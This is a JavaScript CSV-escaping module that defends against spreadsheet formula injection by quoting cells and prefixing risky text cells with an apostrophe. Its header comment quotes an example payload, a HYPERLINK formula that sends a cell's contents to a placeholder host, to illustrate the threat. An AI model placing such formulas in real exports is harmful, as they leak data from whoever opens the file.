// One escaper for every CSV this app writes.
//
// Two separate hazards live in the same character:
//
//   Quoting — a comma, a quote or a newline inside a cell shifts every column
//   after it. RFC 4180 says wrap the cell in quotes and double the quotes
//   inside it.
//
//   Formula injection (CWE-1236) — Excel and LibreOffice evaluate a cell that
//   opens with = + - @ (or a tab/CR) as a formula. Names in these exports come
//   from the opened file: a CSV column header, a MATLAB variable, a filename. A
//   header of =HYPERLINK("http://x?"&A1) therefore runs when the person who
//   exported it opens the file. A leading apostrophe makes the cell text again.
//
// The apostrophe belongs on text cells only, which is why there are two
// functions: -1.5 is a number, not a formula, and prefixing it would corrupt
// the data. Call csvCell for a value that is a number and csvTextCell for
// anything a file could have named.
const NEEDS_QUOTING = /[",\n\r]/;
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function quote(cell) {
    return NEEDS_QUOTING.test(cell) ? `"${cell.replace(/"/g, '""')}"` : cell;
}

/** A numeric or otherwise trusted cell: quoting only. */
export function csvCell(value) {
    return quote(String(value ?? ''));
}

/** A cell whose text a file may have chosen: never let a spreadsheet run it. */
export function csvTextCell(value) {
    const cell = String(value ?? '');
    return quote(FORMULA_LEAD.test(cell) ? `'${cell}` : cell);
}

/**
 * The common case in a mixed table: numbers stay numbers, everything else is
 * treated as text a file could have named.
 */
export function csvValueCell(value) {
    return typeof value === 'number' ? csvCell(value) : csvTextCell(value);
}
